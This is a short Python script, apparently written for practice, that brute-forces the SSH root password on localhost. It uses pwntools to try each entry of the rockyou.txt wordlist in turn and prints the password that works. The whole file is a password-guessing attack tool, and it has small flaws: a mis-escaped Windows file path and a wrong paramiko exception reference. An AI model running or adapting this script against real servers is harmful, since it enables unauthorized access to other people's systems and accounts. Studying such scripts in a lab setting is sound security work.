# pwn to interact with SSH servers
# paramiko for error handling
from pwn import *
import paramiko

host = "127.0.0.1"
username = "root"
attempts = 0
passwords = "C:\rockyou.txt"

with open(passwords, "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("Valid password: '{}'".format(password))
                response.close()
                break
            response.close()
        except paramiko.SSHException.AuthenticationException:
            print("Invalid Password")
        attempts += 1
